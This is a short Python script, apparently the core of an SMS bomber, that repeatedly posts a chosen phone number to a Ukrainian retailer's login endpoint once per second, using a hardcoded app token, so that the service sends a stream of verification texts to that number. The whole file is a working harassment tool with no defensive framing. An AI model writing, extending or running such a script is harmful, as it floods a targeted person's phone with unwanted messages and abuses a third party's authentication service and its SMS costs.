import requests
import time


def sms_service(number, iterations):
    headers = {
        'content-type': 'application/json',
        'x-app-token': 'yF27jwg5orUVo4abrops',
    }

    data = '{"identity": "'+number+'"}'

    for i in range(iterations):
        response = requests.post('https://my.citrus.ua/api/auth/login', headers=headers, data=data)
        time.sleep(1)